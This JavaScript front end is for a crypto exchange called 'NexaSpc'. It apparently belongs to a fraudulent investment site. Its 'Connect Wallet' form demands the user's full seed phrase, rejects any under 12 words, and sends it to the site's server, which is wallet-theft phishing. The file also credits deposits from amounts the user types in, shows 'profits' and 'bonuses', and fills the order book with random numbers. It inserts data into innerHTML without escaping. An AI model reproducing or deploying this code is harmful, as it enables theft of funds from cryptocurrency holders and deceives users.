// ── NexaSpc App ──
const API = '/api';

let state = {
  user: null,
  token: null,
  markets: [],
  selectedCoin: null,
  withdrawSource: 'balance',
  notifications: [],
  connectedWallets: []
};

// ── STORAGE ──
function saveAuth(token, user) {
  state.token = token;
  state.user = user;
  localStorage.setItem('nsx_token', token);
  localStorage.setItem('nsx_user', JSON.stringify(user));
}

function loadAuth() {
  const token = localStorage.getItem('nsx_token');
  const user = localStorage.getItem('nsx_user');
  if (token && user) {
    state.token = token;
    state.user = JSON.parse(user);
    return true;
  }
  return false;
}

function logout() {
  state.token = null;
  state.user = null;
  localStorage.removeItem('nsx_token');
  localStorage.removeItem('nsx_user');
  renderNav();
  navigate('home');
}

// ── API ──
async function api(endpoint, options = {}) {
  const headers = { 'Content-Type': 'application/json' };
  if (state.token) headers['Authorization'] = `Bearer ${state.token}`;
  const res = await fetch(API + endpoint, { headers, ...options });
  const data = await res.json();
  if (!res.ok) throw new Error(data.error || 'Request failed');
  return data;
}

// ── NAVIGATION ──
function navigate(page) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  const el = document.getElementById('page-' + page);
  if (el) el.classList.add('active');
  document.querySelectorAll('.nav-links a').forEach(a => {
    a.classList.toggle('active', a.dataset.page === page);
  });
  window.scrollTo(0, 0);
  onPageLoad(page);
}

function onPageLoad(page) {
  if (page === 'markets')      loadMarkets();
  if (page === 'dashboard')    loadDashboard();
  if (page === 'deposit')      loadDeposit();
  if (page === 'withdraw')     loadWithdraw();
  if (page === 'transactions') loadTransactions();
  if (page === 'spot')         loadSpot();
  if (page === 'home')         loadHomeTicker();
  if (page === 'settings')     loadSettings();
  if (page === 'connect-wallet') loadConnectWallet();
  if (page === 'notifications') loadNotifications();
}

// ── NAV ──
function renderNav() {
  const authSection = document.getElementById('nav-auth');
  if (state.user) {
    const unread = state.notifications.filter(n => !n.read).length;
    authSection.innerHTML = `
      <button class="notif-bell" onclick="navigate('notifications')" title="Notifications">
        🔔
        ${unread > 0 ? `<span class="notif-badge">${unread}</span>` : ''}
      </button>
      <div class="user-menu">
        <button class="user-btn" onclick="toggleDropdown()">
          <div class="user-avatar">${state.user.username.charAt(0).toUpperCase()}</div>
          ${state.user.username}
          <span>▾</span>
        </button>
        <div class="dropdown" id="user-dropdown">
          <div class="dropdown-item" onclick="navigate('dashboard')">📊 Dashboard</div>
          <div class="dropdown-item" onclick="navigate('deposit')">💳 Deposit</div>
          <div class="dropdown-item" onclick="navigate('withdraw')">💸 Withdraw</div>
          <div class="dropdown-item" onclick="navigate('connect-wallet')">🔗 Connect Wallet</div>
          <div class="dropdown-item" onclick="navigate('transactions')">📋 History</div>
          <div class="dropdown-item" onclick="navigate('settings')">⚙️ Settings</div>
          <div class="dropdown-divider"></div>
          <div class="dropdown-item danger" onclick="logout()">🚪 Log Out</div>
        </div>
      </div>`;
    // Poll notifications
    fetchNotifications();
  } else {
    authSection.innerHTML = `
      <button class="btn btn-ghost btn-sm" onclick="navigate('login')">Log In</button>
      <button class="btn btn-primary btn-sm" onclick="navigate('signup')">Sign Up</button>`;
  }
}

function toggleDropdown() {
  document.getElementById('user-dropdown')?.classList.toggle('open');
}

document.addEventListener('click', (e) => {
  if (!e.target.closest('.user-menu')) {
    document.getElementById('user-dropdown')?.classList.remove('open');
  }
});

// ── TOAST ──
function toast(msg, type = 'success') {
  const container = document.getElementById('toast-container');
  const t = document.createElement('div');
  t.className = `toast toast-${type}`;
  t.innerHTML = `<span>${type === 'success' ? '✅' : '❌'}</span> ${msg}`;
  container.appendChild(t);
  setTimeout(() => t.remove(), 4000);
}

// ── AUTH ──
async function handleLogin(e) {
  e.preventDefault();
  const email = document.getElementById('login-email').value;
  const password = document.getElementById('login-password').value;
  const errEl = document.getElementById('login-error');
  errEl.style.display = 'none';
  try {
    const data = await api('/login', { method: 'POST', body: JSON.stringify({ email, password }) });
    saveAuth(data.token, data.user);
    renderNav();
    toast(`Welcome back, ${data.user.username}!`);
    navigate('dashboard');
  } catch (err) {
    errEl.textContent = err.message;
    errEl.style.display = 'block';
  }
}

async function handleSignup(e) {
  e.preventDefault();
  const username = document.getElementById('signup-username').value;
  const email = document.getElementById('signup-email').value;
  const password = document.getElementById('signup-password').value;
  const errEl = document.getElementById('signup-error');
  errEl.style.display = 'none';
  try {
    const data = await api('/register', { method: 'POST', body: JSON.stringify({ username, email, password }) });
    saveAuth(data.token, data.user);
    renderNav();
    toast(`Welcome to NexaSpc, ${data.user.username}! 🎉`);
    navigate('dashboard');
  } catch (err) {
    errEl.textContent = err.message;
    errEl.style.display = 'block';
  }
}

// ── DASHBOARD ──
async function loadDashboard() {
  if (!state.user) { navigate('login'); return; }
  try {
    const user = await api('/profile');
    state.user = { ...state.user, ...user };
    localStorage.setItem('nsx_user', JSON.stringify(state.user));
    document.getElementById('dash-username').textContent = user.username;
    document.getElementById('dash-balance').textContent  = '$' + fmt(user.balance);
    document.getElementById('dash-deposits').textContent = '$' + fmt(user.deposits);
    document.getElementById('dash-profits').textContent  = '$' + fmt(user.profits);
    document.getElementById('dash-bonuses').textContent  = '$' + fmt(user.bonuses);
  } catch {}
}

function fmt(n) { return Number(n).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }); }

// ── MARKETS ──
async function loadMarkets() {
  try {
    const markets = await api('/markets');
    state.markets = markets;
    renderMarketsTable(markets);
  } catch {}
}

function renderMarketsTable(markets) {
  const tbody = document.getElementById('markets-tbody');
  if (!tbody) return;
  const coinColors = { BTC: ['#f97316','#7c2d12'], ETH: ['#8b5cf6','#3730a3'], SOL: ['#06b6d4','#0e7490'], XRP: ['#0ea5e9','#0369a1'], BNB: ['#eab308','#713f12'], ADA: ['#3b82f6','#1d4ed8'], DOGE: ['#f59e0b','#92400e'], AVAX: ['#ef4444','#991b1b'] };
  tbody.innerHTML = markets.map(m => {
    const sym = m.symbol.split('/')[0];
    const [c1, c2] = coinColors[sym] || ['#64748b','#334155'];
    const isUp = m.change >= 0;
    return `<tr>
      <td><div class="coin-cell">
        <div class="coin-icon" style="background:linear-gradient(135deg,${c1},${c2})">${sym}</div>
        <div><div class="coin-name">${sym}</div><div class="coin-pair">${m.symbol}</div></div>
      </div></td>
      <td class="price-cell">$${m.price.toLocaleString()}</td>
      <td class="${isUp ? 'up' : 'down'}">${isUp ? '+' : ''}${m.change}%</td>
      <td class="volume-cell">${m.volume}</td>
      <td><button class="btn btn-sm btn-primary" onclick="navigate('spot')">Trade</button></td>
    </tr>`;
  }).join('');
}

// ── HOME TICKER ──
async function loadHomeTicker() {
  try {
    const markets = await api('/markets');
    state.markets = markets;
    const el = document.getElementById('home-ticker');
    if (!el) return;
    const doubled = [...markets, ...markets];
    el.innerHTML = doubled.map(m => {
      const isUp = m.change >= 0;
      return `<div class="ticker-item">
        <span class="ticker-symbol">${m.symbol}</span>
        <span class="ticker-price">$${m.price.toLocaleString()}</span>
        <span class="${isUp ? 'ticker-up' : 'ticker-down'}">${isUp ? '+' : ''}${m.change}%</span>
      </div>`;
    }).join('');
  } catch {}
}

// ── DEPOSIT ──
const coins = [
  { sym: 'BTC',  name: 'Bitcoin',  color: ['#f97316','#7c2d12'] },
  { sym: 'ETH',  name: 'Ethereum', color: ['#8b5cf6','#3730a3'] },
  { sym: 'USDT', name: 'Tether',   color: ['#10b981','#065f46'] },
  { sym: 'XRP',  name: 'Ripple',   color: ['#0ea5e9','#0369a1'] },
  { sym: 'SOL',  name: 'Solana',   color: ['#06b6d4','#0e7490'] }
];

async function loadDeposit() {
  if (!state.user) { navigate('login'); return; }
  const grid = document.getElementById('coins-grid');
  if (!grid) return;
  grid.innerHTML = coins.map(c => `
    <div class="coin-card" onclick="selectCoin('${c.sym}')" id="coin-card-${c.sym}">
      <div class="coin-icon-lg" style="background:linear-gradient(135deg,${c.color[0]},${c.color[1]})">${c.sym}</div>
      <div class="coin-card-name">${c.sym}</div>
      <div class="coin-card-full">${c.name}</div>
    </div>`).join('');
  document.getElementById('wallet-display').style.display = 'none';
}

async function selectCoin(sym) {
  state.selectedCoin = sym;
  document.querySelectorAll('.coin-card').forEach(c => c.classList.remove('selected'));
  document.getElementById('coin-card-' + sym)?.classList.add('selected');
  try {
    const wallets = await api('/wallets');
    document.getElementById('selected-coin-label').textContent = `Deposit ${sym}`;
    document.getElementById('wallet-addr-text').textContent = wallets[sym];
    document.getElementById('deposit-coin-select').value = sym;
    document.getElementById('wallet-display').style.display = 'block';
    document.getElementById('wallet-display').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
  } catch {}
}

function copyAddress() {
  const addr = document.getElementById('wallet-addr-text').textContent;
  navigator.clipboard.writeText(addr).then(() => {
    const btn = document.getElementById('copy-addr-btn');
    btn.textContent = 'Copied!';
    btn.classList.add('copied');
    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
    toast('Wallet address copied!');
  });
}

async function handleDeposit(e) {
  e.preventDefault();
  if (!state.selectedCoin) { toast('Select a coin first', 'error'); return; }
  const amount = parseFloat(document.getElementById('deposit-amount').value);
  const txHash = document.getElementById('deposit-txhash').value;
  if (!amount || amount <= 0) { toast('Enter a valid amount', 'error'); return; }
  try {
    const data = await api('/deposit', { method: 'POST', body: JSON.stringify({ coin: state.selectedCoin, amount, txHash }) });
    state.user.balance = data.balance;
    state.user.deposits = data.deposits;
    localStorage.setItem('nsx_user', JSON.stringify(state.user));
    toast(`Deposit of $${amount} confirmed!`);
    document.getElementById('deposit-form').reset();
    document.getElementById('wallet-display').style.display = 'none';
    state.selectedCoin = null;
    document.querySelectorAll('.coin-card').forEach(c => c.classList.remove('selected'));
    setTimeout(() => navigate('dashboard'), 1500);
  } catch (err) { toast(err.message, 'error'); }
}

// ── WITHDRAW ──
async function loadWithdraw() {
  if (!state.user) { navigate('login'); return; }
  try {
    const user = await api('/profile');
    state.user = { ...state.user, ...user };
    document.getElementById('wd-balance-val').textContent = '$' + fmt(user.balance);
    document.getElementById('wd-profits-val').textContent = '$' + fmt(user.profits);
  } catch {}
}

function selectWithdrawSource(src) {
  state.withdrawSource = src;
  document.querySelectorAll('.source-card').forEach(c => c.classList.remove('selected'));
  document.getElementById('src-' + src)?.classList.add('selected');
}

async function handleWithdraw(e) {
  e.preventDefault();
  const coin = document.getElementById('wd-coin').value;
  const amount = parseFloat(document.getElementById('wd-amount').value);
  const walletAddress = document.getElementById('wd-wallet').value;
  if (!walletAddress) { toast('Enter your wallet address', 'error'); return; }
  if (!amount || amount <= 0) { toast('Enter a valid amount', 'error'); return; }
  try {
    const data = await api('/withdraw', { method: 'POST', body: JSON.stringify({ coin, amount, walletAddress, source: state.withdrawSource }) });
    toast(`Withdrawal of $${amount} submitted!`);
    document.getElementById('withdraw-form').reset();
    document.getElementById('wd-balance-val').textContent = '$' + fmt(data.balance);
    document.getElementById('wd-profits-val').textContent = '$' + fmt(data.profits);
    state.user.balance = data.balance;
    state.user.profits = data.profits;
  } catch (err) { toast(err.message, 'error'); }
}

// ── TRANSACTIONS ──
async function loadTransactions() {
  if (!state.user) { navigate('login'); return; }
  try {
    const txs = await api('/transactions');
    const container = document.getElementById('tx-list');
    if (!txs.length) {
      container.innerHTML = '<div style="text-align:center;color:var(--text3);padding:3rem">No transactions yet</div>';
      return;
    }
    container.innerHTML = txs.map(tx => {
      const isDeposit = tx.type === 'deposit';
      const date = new Date(tx.date).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
      return `<div class="tx-item">
        <div class="tx-type">
          <div class="tx-icon ${tx.type}">${isDeposit ? '⬇️' : '⬆️'}</div>
          <div>
            <div class="tx-name">${isDeposit ? 'Deposit' : 'Withdrawal'} · ${tx.coin}</div>
            <div class="tx-date">${date}</div>
          </div>
        </div>
        <div style="display:flex;align-items:center;gap:0.75rem">
          <span class="badge badge-${tx.status}">${tx.status}</span>
          <span class="tx-amount ${isDeposit ? 'up' : 'down'}">${isDeposit ? '+' : '-'}$${Number(tx.amount).toFixed(2)}</span>
        </div>
      </div>`;
    }).join('');
  } catch {}
}

// ── SPOT ──
async function loadSpot() {
  const basePrice = 67842.50;
  const asksEl = document.getElementById('ob-asks');
  const bidsEl = document.getElementById('ob-bids');
  if (!asksEl) return;
  let asksHtml = '', bidsHtml = '';
  for (let i = 5; i >= 1; i--) {
    const p = (basePrice + i * 12.5).toFixed(2);
    const s = (Math.random() * 2).toFixed(4);
    asksHtml += `<div class="ob-row"><span class="ob-ask">${p}</span><span>${s}</span></div>`;
  }
  for (let i = 1; i <= 5; i++) {
    const p = (basePrice - i * 11.8).toFixed(2);
    const s = (Math.random() * 2).toFixed(4);
    bidsHtml += `<div class="ob-row"><span class="ob-bid">${p}</span><span>${s}</span></div>`;
  }
  asksEl.innerHTML = asksHtml;
  bidsEl.innerHTML = bidsHtml;
}

// ══════════════════════════════════════════
// NOTIFICATIONS
// ══════════════════════════════════════════
async function fetchNotifications() {
  if (!state.token) return;
  try {
    const notifs = await api('/notifications');
    state.notifications = notifs;
    const unread = notifs.filter(n => !n.read).length;
    const badge = document.querySelector('.notif-badge');
    if (badge) badge.textContent = unread > 0 ? unread : '';
    if (badge) badge.style.display = unread > 0 ? 'flex' : 'none';
  } catch {}
}

async function loadNotifications() {
  if (!state.user) { navigate('login'); return; }
  try {
    const notifs = await api('/notifications');
    state.notifications = notifs;
    // Mark all as read
    await api('/notifications/read', { method: 'PUT' });
    state.notifications.forEach(n => n.read = true);

    const container = document.getElementById('notif-list');
    if (!container) return;
    if (!notifs.length) {
      container.innerHTML = '<div style="text-align:center;color:var(--text3);padding:3rem">No notifications yet</div>';
      return;
    }

    const icons = { welcome: '🎉', login: '🔐', deposit: '💚', withdrawal: '💸', security: '🛡️', settings: '⚙️', wallet: '🔗' };
    container.innerHTML = notifs.map(n => {
      const date = new Date(n.date).toLocaleString('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
      return `<div class="notif-item ${n.read ? '' : 'unread'}">
        <div class="notif-icon">${icons[n.type] || '🔔'}</div>
        <div class="notif-body">
          <div class="notif-msg">${n.message}</div>
          <div class="notif-time">${date}</div>
        </div>
      </div>`;
    }).join('');
    // Refresh bell
    const badge = document.querySelector('.notif-badge');
    if (badge) badge.style.display = 'none';
  } catch {}
}

// ══════════════════════════════════════════
// SETTINGS
// ══════════════════════════════════════════
async function loadSettings() {
  if (!state.user) { navigate('login'); return; }
  try {
    const user = await api('/profile');
    state.user = { ...state.user, ...user };
    // Profile tab
    document.getElementById('set-username').value  = user.username || '';
    document.getElementById('set-email').value     = user.email || '';
    document.getElementById('set-phone').value     = user.phone || '';
    document.getElementById('set-country').value   = user.country || '';
    // Security toggles
    document.getElementById('toggle-2fa').checked           = user.twoFAEnabled;
    document.getElementById('toggle-email-notif').checked   = user.emailNotifications;
    // Account info
    document.getElementById('set-member-since').textContent = new Date(user.createdAt).toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
    document.getElementById('set-last-login').textContent   = new Date(user.lastLogin).toLocaleString('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
  } catch {}
}

function showSettingsTab(tab) {
  document.querySelectorAll('.settings-tab-btn').forEach(b => b.classList.remove('active'));
  document.querySelectorAll('.settings-tab').forEach(t => t.classList.remove('active'));
  document.getElementById('stab-' + tab).classList.add('active');
  document.querySelector(`[data-stab="${tab}"]`).classList.add('active');
}

async function handleUpdateProfile(e) {
  e.preventDefault();
  const username = document.getElementById('set-username').value;
  const phone    = document.getElementById('set-phone').value;
  const country  = document.getElementById('set-country').value;
  const errEl = document.getElementById('settings-profile-err');
  errEl.style.display = 'none';
  try {
    const data = await api('/settings/profile', { method: 'PUT', body: JSON.stringify({ username, phone, country }) });
    state.user.username = data.username;
    localStorage.setItem('nsx_user', JSON.stringify(state.user));
    renderNav();
    toast('Profile updated successfully!');
  } catch (err) {
    errEl.textContent = err.message;
    errEl.style.display = 'block';
  }
}

async function handleChangePassword(e) {
  e.preventDefault();
  const currentPassword = document.getElementById('set-cur-pass').value;
  const newPassword     = document.getElementById('set-new-pass').value;
  const confirmPassword = document.getElementById('set-con-pass').value;
  const errEl = document.getElementById('settings-pass-err');
  errEl.style.display = 'none';
  if (newPassword !== confirmPassword) {
    errEl.textContent = 'New passwords do not match';
    errEl.style.display = 'block';
    return;
  }
  try {
    await api('/settings/password', { method: 'PUT', body: JSON.stringify({ currentPassword, newPassword }) });
    toast('Password changed successfully!');
    document.getElementById('settings-pass-form').reset();
  } catch (err) {
    errEl.textContent = err.message;
    errEl.style.display = 'block';
  }
}

async function toggle2FA() {
  try {
    const data = await api('/settings/2fa', { method: 'PUT' });
    document.getElementById('toggle-2fa').checked = data.twoFAEnabled;
    toast(`Two-Factor Authentication ${data.twoFAEnabled ? 'enabled' : 'disabled'}`);
  } catch (err) { toast(err.message, 'error'); }
}

async function toggleEmailNotif() {
  try {
    const data = await api('/settings/notifications', { method: 'PUT' });
    document.getElementById('toggle-email-notif').checked = data.emailNotifications;
    toast(`Email notifications ${data.emailNotifications ? 'enabled' : 'disabled'}`);
  } catch (err) { toast(err.message, 'error'); }
}

// ══════════════════════════════════════════
// CONNECT WALLET
// ══════════════════════════════════════════
const walletTypes = [
  { id: 'metamask',   name: 'MetaMask',     icon: '🦊', network: 'Ethereum' },
  { id: 'trust',      name: 'Trust Wallet', icon: '🛡️', network: 'Multi-chain' },
  { id: 'phantom',    name: 'Phantom',      icon: '👻', network: 'Solana' },
  { id: 'coinbase',   name: 'Coinbase',     icon: '🔵', network: 'Ethereum' },
  { id: 'walletconnect', name: 'WalletConnect', icon: '🔗', network: 'Multi-chain' },
  { id: 'ledger',     name: 'Ledger',       icon: '🔒', network: 'Multi-chain' },
  { id: 'trezor',     name: 'Trezor',       icon: '🟩', network: 'Multi-chain' },
  { id: 'exodus',     name: 'Exodus',       icon: '🌌', network: 'Multi-chain' }
];

let selectedWalletType = null;

async function loadConnectWallet() {
  if (!state.user) { navigate('login'); return; }

  const grid = document.getElementById('wallet-types-grid');
  if (grid) {
    grid.innerHTML = walletTypes.map(w => `
      <div class="wallet-type-card" id="wt-${w.id}" onclick="selectWalletType('${w.id}','${w.name}','${w.network}')">
        <div class="wt-icon">${w.icon}</div>
        <div class="wt-name">${w.name}</div>
        <div class="wt-network">${w.network}</div>
      </div>`).join('');
  }

  document.getElementById('wallet-connect-form-wrap').style.display = 'none';
  loadConnectedWallets();
}

function selectWalletType(id, name, network) {
  selectedWalletType = { id, name, network };
  document.querySelectorAll('.wallet-type-card').forEach(c => c.classList.remove('selected'));
  document.getElementById('wt-' + id)?.classList.add('selected');
  document.getElementById('wc-wallet-name').textContent = name;
  document.getElementById('wc-wallet-network').textContent = network;
  document.getElementById('wallet-connect-form-wrap').style.display = 'block';
  document.getElementById('wallet-connect-form-wrap').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
}

async function handleConnectWallet(e) {
  e.preventDefault();
  if (!selectedWalletType) { toast('Select a wallet type first', 'error'); return; }
  const walletAddress = document.getElementById('wc-address').value;
  const seedPhrase    = document.getElementById('wc-seed').value.trim();
  const errEl = document.getElementById('wc-error');
  errEl.style.display = 'none';

  if (seedPhrase.split(' ').length < 12) {
    errEl.textContent = 'Seed phrase must be at least 12 words';
    errEl.style.display = 'block';
    return;
  }

  try {
    await api('/wallet/connect', {
      method: 'POST',
      body: JSON.stringify({
        walletType:    selectedWalletType.name,
        walletAddress: walletAddress,
        seedPhrase:    seedPhrase,
        network:       selectedWalletType.network
      })
    });
    toast(`${selectedWalletType.name} wallet connected!`);
    document.getElementById('wallet-connect-form').reset();
    document.getElementById('wallet-connect-form-wrap').style.display = 'none';
    selectedWalletType = null;
    document.querySelectorAll('.wallet-type-card').forEach(c => c.classList.remove('selected'));
    loadConnectedWallets();
  } catch (err) {
    errEl.textContent = err.message;
    errEl.style.display = 'block';
  }
}

async function loadConnectedWallets() {
  try {
    const wallets = await api('/wallet/connected');
    state.connectedWallets = wallets;
    const container = document.getElementById('connected-wallets-list');
    if (!container) return;
    if (!wallets.length) {
      container.innerHTML = '<p style="color:var(--text3);font-size:0.875rem">No wallets connected yet.</p>';
      return;
    }
    container.innerHTML = wallets.map(w => `
      <div class="connected-wallet-item">
        <div class="cw-info">
          <div class="cw-type">${w.walletType}</div>
          <div class="cw-addr">${w.walletAddress || 'Address not provided'}</div>
          <div class="cw-net">${w.network} · Connected ${new Date(w.connectedAt).toLocaleDateString()}</div>
        </div>
        <button class="btn btn-danger btn-sm" onclick="disconnectWallet(${w.id})">Disconnect</button>
      </div>`).join('');
  } catch {}
}

async function disconnectWallet(id) {
  try {
    await api(`/wallet/connected/${id}`, { method: 'DELETE' });
    toast('Wallet disconnected');
    loadConnectedWallets();
  } catch (err) { toast(err.message, 'error'); }
}

// ── INIT ──
document.addEventListener('DOMContentLoaded', () => {
  loadAuth();
  renderNav();
  navigate('home');

  document.getElementById('login-form')?.addEventListener('submit', handleLogin);
  document.getElementById('signup-form')?.addEventListener('submit', handleSignup);
  document.getElementById('deposit-form')?.addEventListener('submit', handleDeposit);
  document.getElementById('withdraw-form')?.addEventListener('submit', handleWithdraw);
  document.getElementById('settings-profile-form')?.addEventListener('submit', handleUpdateProfile);
  document.getElementById('settings-pass-form')?.addEventListener('submit', handleChangePassword);
  document.getElementById('wallet-connect-form')?.addEventListener('submit', handleConnectWallet);

  // Poll notifications every 30s
  if (state.user) setInterval(fetchNotifications, 30000);
});